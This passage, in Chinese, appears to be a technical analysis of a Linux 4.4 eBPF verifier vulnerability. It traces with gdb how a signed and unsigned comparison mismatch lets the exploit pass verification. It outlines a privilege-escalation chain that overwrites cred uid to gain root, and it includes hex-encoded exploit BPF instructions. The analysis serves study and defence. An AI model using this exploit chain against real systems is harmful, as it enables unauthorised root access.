        at /build/linux-fQ94TU/linux-4.4.0/kernel/bpf/syscall.c:783
    #4  SyS_bpf (cmd=5, uattr=140722476394128, size=48)
        at /build/linux-fQ94TU/linux-4.4.0/kernel/bpf/syscall.c:725
    #5  0xffffffff8184efc8 in entry_SYSCALL_64 ()
        at /build/linux-fQ94TU/linux-4.4.0/arch/x86/entry/entry_64.S:193
    #6  0x0000000000000001 in irq_stack_union ()
    #7  0x0000000000000000 in ?? ()
    (gdb)
首先看第一条赋值语句BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF)，do_check中最终的赋值语句如下：
其中dst_reg为虚拟执行过程中的寄存器结构体，结构体定义如下：
可以看到该结构体有2个字段，第一个为type，代表寄存器数据的类型，此处为CONST_IMM，CONST_IMM的值为8.另外一个为常量立即数的具体数值，可以看到类型为int有符号整形。
我们在此处下断点，可以看到具体的赋值过程，如下:
    (gdb) x/10 $rip-4
       0xffffffff8117b0ac :  mov    DWORD PTR [rsi+rax*1+0x8],edx
    => 0xffffffff8117b0b0 :  
        jmp    0xffffffff8117a38c 
       0xffffffff8117b0b5 :  mov    rdi,QWORD PTR [rsp+0x38]
       0xffffffff8117b0ba :  mov    rdx,rax
       0xffffffff8117b0bd :  movzx  esi,al
       0xffffffff8117b0c0 :  and    edx,0x18
       0xffffffff8117b0c3 :  mov    rdx,QWORD PTR [rdx-0x7e5db140]
       0xffffffff8117b0ca :  movzx  ecx,BYTE PTR [rdi+0x1]
       0xffffffff8117b0ce :  movsx  r8d,WORD PTR [rdi+0x2]
       0xffffffff8117b0d3 :  mov    r9d,DWORD PTR [rdi+0x4]
    (gdb) i r $edx
    edx            0xffffffff   -1
    (gdb) x/10x $rsi+$rax
    0xffff8800781930a8: 0x00000008  0x00000000  0xffffffff  0x00000000
    0xffff8800781930b8: 0x00000006  0x00000000  0x00000000  0x00000000
    0xffff8800781930c8: 0x00000000  0x00000000
    (gdb)
`$rsi+$rax`处即为reg_state结构体，可以看到第一个字段为8，第二个字段为0Xffffffff。
然后我们跟进第二条指令中的比较语句BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF,
2)，do_check检测到跳转类指令时，根据跳转类型进入不通的检测分支，此处是JNE跳转，进入check_cond_jmp_op分支，如下图:
Do_check在校验条件类跳转指令的时候，会判断条件是否成立，如果是非确定性跳转的话，就说明接下来2个分支都有可能执行（分支A和分支B），这时do_check会把下一步需要跳转到的指令编号（分支B）放到一个临时栈中备用，这样当前指令顺序校验（分支A）过程中遇到EXIT指令时，会从临时栈中取出之前保存的下一条指令的序号（分支B）继续校验。如果跳转指令恒成立的话，就不会再往临时栈中放入分支B，因为分支B永远不会执行，如下图：
第一个红框即为虚拟寄存器中的imm与指令中提供的imm进行比较，这两个类型如下：
可以看到等号两侧的数据类型完全一致，都为有符号整数，所以此处条件跳转条件恒成立，不会往临时栈中push分支B指令编号。
接下来看BPF_EXIT_INSN()，刚才提到在校验EXIT指令时，会从临时栈中尝试取指令（调用pop_stack函数），如果临时栈中有指令，那就说明还有其他可能执行到的分支，需要继续校验，如果取不到值，表示当前这条EXIT指令确实是BPF程序最后一条可以执行到的指令，此时pop_stack会返回-1，然后break跳出do_check校验循环，do_check执行结束，校验通过，如下图：
跟进pop_stack，如下图：
实际执行过程如下：
    (gdb) x/10i $rip
    => 0xffffffff81178f29 :    test   r8,r8  //此处判断env->head是否为NULL
       0xffffffff81178f2c :   
        je     0xffffffff81178fb4  //为NULL时，跳转到0xffffffff81178fb4
       0xffffffff81178f32 :   push   rbp
       0xffffffff81178f33 :   mov    rax,rsi
       0xffffffff81178f36 :   lea    rcx,[rdi+0x18]
       0xffffffff81178f3a :   mov    rdx,rdi
       0xffffffff81178f3d :   lea    rdi,[rdi+0x20]
       0xffffffff81178f41 :   mov    rbp,rsp
       0xffffffff81178f44 :   push   r13
       0xffffffff81178f46 :   push   r12
    (gdb) i r $r8
    r8             0x0  0
    (gdb) x/10i 0xffffffff81178fb4
       0xffffffff81178fb4 :  mov    eax,0xffffffff  //pop_stack返回-1
       0xffffffff81178fb9 :  ret     //pop_stack返回-1
       0xffffffff81178fba:  nop    WORD PTR [rax+rax*1+0x0]
       0xffffffff81178fc0 :    nop    DWORD PTR [rax+rax*1+0x0]
       0xffffffff81178fc5 :  push   rbp
       0xffffffff81178fc6 :  mov    rbp,rsp
       0xffffffff81178fc9 :  sub    rsp,0x50
       0xffffffff81178fcd : mov    rax,QWORD PTR gs:0x28
       0xffffffff81178fd6 : mov    QWORD PTR [rsp+0x18],rax
       0xffffffff81178fdb : xor    eax,eax
    (gdb)
到此为止我们了解了BPF的校验过程，这个exp一共有41条指令，BPF只校验了4条指令，然后返回校验成功。
接下来我们继续跟进BPF指令的执行过程，对应的代码如下（路径为kernel/bpf/core.c）：
其中DST为目标寄存器，IMM为立即数，我们跟进DST的定义：
跟进IMM的定义：
很明显，等号两边的数据类型是不一致的，所以导致这里的条件跳转语句的结果完全相反，以下为实际执行过程：
    (gdb) x/10i $rip
    => 0xffffffff8117731f :    
        cmp    QWORD PTR [rbp+rax*8-0x270],rdx
       0xffffffff81177327 :    
        je     0xffffffff81177d8a 
       0xffffffff8117732d :    movsx  rax,WORD PTR [rbx+0x2]
       0xffffffff81177332 :    lea    rbx,[rbx+rax*8+0x8]
       0xffffffff81177337 :    
        jmp    0xffffffff81176ae0 
       0xffffffff8117733c :    movzx  eax,BYTE PTR [rbx+0x1]
       0xffffffff81177340 :    mov    edx,eax
       0xffffffff81177342 :    shr    dl,0x4
       0xffffffff81177345 :    and    edx,0xf
       0xffffffff81177348 :    
        cmp    QWORD PTR [rbp+rdx*8-0x270],0x0
    (gdb) i r $rdx
    rdx            0xffffffffffffffff   -1
    (gdb) x/10x (rbp+rax*8-0x270)
    No symbol "rbp" in current context.
    (gdb) x/10x ($rbp+$rax*8-0x270)
    0xffff880076143a78: 0xffffffff  0x00000000  0x76143c88  0xffff8800
    0xffff880076143a88: 0x00000001  0x00000000  0x00000001  0x01000000
    0xffff880076143a98: 0x746ee000  0xffff8800
    (gdb)
等号两边的值完全不一样，这里的跳转条件成立，会往后跳2条指令继续执行，和虚拟执行的过程相反。
接下来就是分析exp里面的BPF指令了，通过自定义BPF指令，我们可以绕过安全校验实现任意内核指针泄露，任意内核地址读写。
构造一下攻击路径：
1.申请一个MAP，长度为3；
2.这个MAP的第一个元素为操作指令，第2个元素为需要读写的内存地址，第3个元素用来存放读取到的内容。此时这个MAP相当于一个CC，3个元素组成一个控制指令。
3.组装一个指令，读取内核的栈地址。根据内核栈地址获取到current的地址。
4.读current结构体的第一个成员，或得task_struct的地址，继而加上cred的偏移得到cred地址，最终获取到uid的地址。
5.组装一个写指令，向上一步获取到的uid地址写入0.
6.启动新的bash进程，该进程的uid为0，提权成功。
Exp中就是按照如上的攻击路径来提权的，申请完map之后，首先发送获取内核栈地址的指令，如下：
    bpf_update_elem(0, 0); 
    bpf_update_elem(1, 0); 
    bpf_update_elem(2, 0);
然后通过调用writemsg触发BPF程序运行，BPF会进入如下分支：
    "\x18\x19\x00\x00\x03\x00\x00\x00"\  # BPF_LD_MAP_FD(BPF_REG_9, mapfd),                 /* r9=mapfd               */
    #BPF_MAP_GET(0, BPF_REG_6)  r6=op
    "\xbf\x91\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */
    "\xbf\xa2\x00\x00\x00\x00\x00\x00"\  #BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */
    "\x07\x02\x00\x00\xfc\xff\xff\xff"\  #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */
    "\x62\x0a\xfc\xff\x00\x00\x00\x00"\  #BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=0),           /* *(u32 *)(fp - 4) = idx */
    "\x85\x00\x00\x00\x01\x00\x00\x00"\  #BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
    "\x55\x00\x01\x00\x00\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */
    "\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),                                  /*   exit(0);             */
    "\x79\x06\x00\x00\x00\x00\x00\x00"\  #BPF_LDX_MEM(BPF_DW, (r6), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */
之前提到过，BPF的r10寄存器相当于x86_64的rbp，是指向内核栈的，所以这里第一行指令将map的标识放到r9，第二条指令将r9放到r1，作为后续调用BPF_FUNC_map_lookup_elem函数的第一个参数，第三条指令将内核栈指针赋值给r2，第四条指令在栈上开辟4个字节的空间，第五条指令将map元素的序号放到r2，第六条指令取map中第r2个元素的值并把返回值存入r0，第七条指令判断BPF_FUNC_map_lookup_elem有没有执行成功，r0=0则未成功。成功后执行第9条指令，将取到的值放到r6中。继续依次往下执行，直到执行到下面的路径：
    "\x55\x06\x03\x00\x00\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 3),             /* if (op == 0)          */
    "\x79\x73\x00\x00\x00\x00\x00\x00"\  #BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0),
    "\x7b\x32\x00\x00\x00\x00\x00\x00"\  #BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0),
    "\x95\x00\x00\x00\x00\x00\x00\x00"\  #BPF_EXIT_INSN(),
    "\x55\x06\x02\x00\x01\x00\x00\x00"\  #BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 2),